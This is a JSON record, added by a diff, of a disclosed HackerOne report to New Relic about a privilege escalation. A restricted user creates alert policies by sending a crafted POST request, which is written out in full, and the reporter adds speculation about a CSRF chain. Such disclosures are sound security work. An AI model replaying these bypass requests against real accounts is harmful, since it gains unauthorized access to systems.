@@ -1,0 +1,117 @@
+{
+  "id": 380413,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODA0MTM=",
+  "url": "https://hackerone.com/reports/380413",
+  "title": "Restricted user can bypass permissions restriction to create NR Alert policies",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-07-11T04:57:48.227Z",
+  "submitted_at": "2018-07-11T04:57:48.227Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jon_bottarini",
+    "url": "/jon_bottarini",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17011,
+    "url": "https://hackerone.com/newrelic",
+    "handle": "newrelic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "New Relic",
+      "twitter_handle": "newrelic",
+      "website": "https://newrelic.com",
+      "about": "New Relic's Coordinated Disclosure Program"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-09-04T11:00:07.925Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-20T02:43:23.185Z",
+  "team_member_agreed_on_going_public_at": "2020-09-04T11:00:07.704Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "So this one is similar to my other privilege escalation issues, but it comes with a sidenote which may lead to some more interesting issues if you feel like digging into it. \n\n**Issue:** User with read only privileges can create NR Alert policies through POST request to Infrastructure-Data service subdomain\n\n## Description \n\nWhen a restricted user navigates to NR Alerts, they don't have the option to create a new alert policy. This can be bypassed by sending a custom POST request to `infrastructure-data.service.newrelic.com`. \n\n## Steps to Reproduce\n\n1. Create NR Account, from admin account, invite a new user with \"Restricted\" base roles\n2. From the restricted user, login and send the following POST request \n\n```\nPOST /accounts/{ACCOUNT_ID}/policies HTTP/1.1\nHost: infrastructure-data.service.newrelic.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://infrastructure.newrelic.com/accounts/1523936/settings/alerts/create?policyId=77624\nContent-Type: application/json\nX-Dest: alerting_rest_api\nContent-Length: 83\nOrigin: https://infrastructure.newrelic.com\nCookie: (restricted user cookies) \nDNT: 1\nConnection: close\n\n{\"account_id\":\"1523936\",\"name\":\"restricted_user_made_this,\"rollup_strategy\":\"PER_POLICY\"}\n```\n\nReplace `account_id` with the account ID the restricted user has been invited to. Make sure you're using the restricted user cookies. \n\nNew policy will be created.\n\n__Read further only if you want to read my stream of consciousness around this interesting request__ \n\nThis is more of a hypothetical issue (I know, I know... but hear me out) but I've played around with it and I found it interesting. If you look at the above POST request - it doesn't have the usual NR `XSRF-TOKEN=` included in the request. Infact - the only protection from CSRF that this action has is in the `X-Dest: alerting_rest_api` header. \n\nNow, hypothetically, if we had any [CRLF/HTTP Response Splitting](https://www.acunetix.com/websitesecurity/crlf-injection/) vulnerability, we could essentially perform this CSRF without issue - except that `Content-Type: application/json` is preventing us from doing so, if we try sending the request with `text/plain` encoding, we get this nice little error message:\n\n`<!DOCTYPE html><html><head><title>ERROR</title></head><body><h1>error</h1></body></html>`\n\nFear not - for infact there _is_ a way for browsers to perform this type of `application/json` request - using our good ol' buddy Flash: https://blog.cm2.pw/forging-content-type-header-with-flash/\n\nNow, this is not working, and doesn't matter anyway because we don't have a CRLF vuln, but this was fun to look into and if the day ever comes that I _do_ find a CRLF, I'll come back here and try it out. Maybe it would be wise to put a XSRF token on this request so that doesn't happen :P \n\nCheers!\n\n## Impact\n\nWhen a restricted user navigates to NR Alerts, they don't have the option to create a new alert policy. This can be bypassed by sending a custom POST request to `infrastructure-data.service.newrelic.com`.",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2020-09-19T02:43:23.227Z",
+  "allow_singular_disclosure_after": -107346237.97808202,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "wi11",
+    "ali",
+    "faizannehal",
+    "prateek_thakare",
+    "cryptographer"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 6454,
+    "asset_type": "URL",
+    "asset_identifier": "alerts.newrelic.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
